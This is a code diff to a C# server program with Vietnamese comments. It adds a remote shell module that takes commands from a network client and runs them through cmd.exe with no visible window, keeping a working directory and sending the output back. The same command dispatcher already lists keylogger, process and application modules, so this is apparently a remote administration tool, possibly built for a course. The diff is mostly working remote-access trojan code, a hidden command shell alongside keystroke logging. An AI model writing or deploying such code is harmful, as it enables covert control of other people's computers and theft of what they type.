@@ -107,6 +107,7 @@ namespace ServerApp
                 switch (s)
                 {
                     // --- NHÓM 1: CÁC MODULE CŨ ---
+                    case "CMD": remote_shell(); break;
                     case "KEYLOG": keylog(); break;
                     case "PROCESS": process(); break;
                     case "APPLICATION": application(); break;
@@ -124,6 +125,126 @@ namespace ServerApp
         {
             try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
             catch { s = "QUIT"; }
+        }
+
+        // --- KHAI BÁO BIẾN TOÀN CỤC CHO MODULE SHELL (Đặt bên ngoài các hàm) ---
+        // Biến này sẽ lưu vị trí hiện tại của CMD, không bị mất đi khi Client ngắt kết nối
+        public string ShellCurrentPath = "";
+
+        // --- MODULE REMOTE SHELL (CMD) ---
+        public void remote_shell()
+        {
+            String cmd = "";
+
+            // Khởi tạo lần đầu
+            if (string.IsNullOrEmpty(ShellCurrentPath))
+            {
+                ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);
+            }
+
+            while (true)
+            {
+                receiveSignal(ref cmd);
+
+                if (cmd == "QUIT") return;
+
+                // --- THÊM MỚI: Xử lý lệnh RESET từ Disconnect ---
+                if (cmd == "RESET")
+                {
+                    ShellCurrentPath = ""; // Xóa đường dẫn đã lưu
+                    return; // Thoát module
+                }
+
+                if (cmd == "EXEC")
+                {
+                    // ... (Toàn bộ phần code xử lý lệnh EXEC cũ giữ nguyên không đổi) ...
+                    // Để tiết kiệm không gian, tôi không paste lại đoạn xử lý EXEC dài dòng ở đây
+                    // Bạn hãy giữ nguyên nội dung bên trong block if (cmd == "EXEC") { ... } của bước trước nhé.
+
+                    // Code cũ của EXEC bắt đầu từ: string commandToRun = Program.nr.ReadLine().Trim();
+                    // ... cho đến hết block EXEC
+                    string commandToRun = Program.nr.ReadLine().Trim();
+                    string output = "";
+                    bool isBlacklisted = false;
+
+                    // 1. CHẶN LỆNH GÂY TREO
+                    string[] blacklist = { "cmd", "powershell", "python", "bash", "sh" };
+                    if (blacklist.Contains(commandToRun.ToLower()))
+                    {
+                        output = "Error: Interactive commands are not supported.\n";
+                        isBlacklisted = true;
+                    }
+
+                    if (!isBlacklisted)
+                    {
+                        // 2. XỬ LÝ CD
+                        if (commandToRun.ToLower().StartsWith("cd ") || commandToRun.ToLower() == "cd..")
+                        {
+                            try
+                            {
+                                string pathArg = (commandToRun.Length > 2) ? commandToRun.Substring(2).Trim() : "";
+                                if (commandToRun.ToLower() == "cd..") pathArg = "..";
+
+                                string newPath = Path.GetFullPath(Path.Combine(ShellCurrentPath, pathArg));
+
+                                if (Directory.Exists(newPath)) ShellCurrentPath = newPath;
+                                else output = "The system cannot find the path specified.\n";
+                            }
+                            catch (Exception ex) { output = ex.Message + "\n"; }
+                        }
+                        // 3. XỬ LÝ ĐỔI Ổ ĐĨA
+                        else if (commandToRun.Length == 2 && commandToRun[1] == ':')
+                        {
+                            try
+                            {
+                                if (Directory.Exists(commandToRun + "\\")) ShellCurrentPath = commandToRun.ToUpper() + "\\";
+                                else output = "The system cannot find the drive specified.\n";
+                            }
+                            catch { output = "Error changing drive.\n"; }
+                        }
+                        // 4. LỆNH KHÁC
+                        else
+                        {
+                            try
+                            {
+                                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + commandToRun);
+                                psi.RedirectStandardOutput = true;
+                                psi.RedirectStandardError = true;
+                                psi.UseShellExecute = false;
+                                psi.CreateNoWindow = true;
+                                psi.StandardOutputEncoding = Encoding.UTF8;
+                                psi.StandardErrorEncoding = Encoding.UTF8;
+                                psi.WorkingDirectory = ShellCurrentPath;
+
+                                using (Process p = Process.Start(psi))
+                                {
+                                    if (!p.WaitForExit(5000))
+                                    {
+                                        try { p.Kill(); } catch { }
+                                        output += "Command timed out.\n";
+                                    }
+                                    output += p.StandardOutput.ReadToEnd();
+                                    string err = p.StandardError.ReadToEnd();
+                                    if (!string.IsNullOrEmpty(err)) output += "\n" + err;
+                                }
+                            }
+                            catch (Exception ex) { output = "Error: " + ex.Message + "\n"; }
+                        }
+                    }
+
+                    // 5. GẮN PROMPT
+                    if (!output.EndsWith("\n") && output.Length > 0) output += "\n";
+                    string displayPath = ShellCurrentPath;
+                    if (displayPath.Length > 3 && displayPath.EndsWith("\\"))
+                        displayPath = displayPath.Substring(0, displayPath.Length - 1);
+                    output += displayPath + ">";
+
+                    byte[] buffer = Encoding.UTF8.GetBytes(output);
+                    Program.nw.WriteLine(buffer.Length.ToString());
+                    Program.nw.Flush();
+                    if (buffer.Length > 0) Program.client.Send(buffer);
+                }
+            }
         }
 
         // --- MODULE KEYLOGGER ---
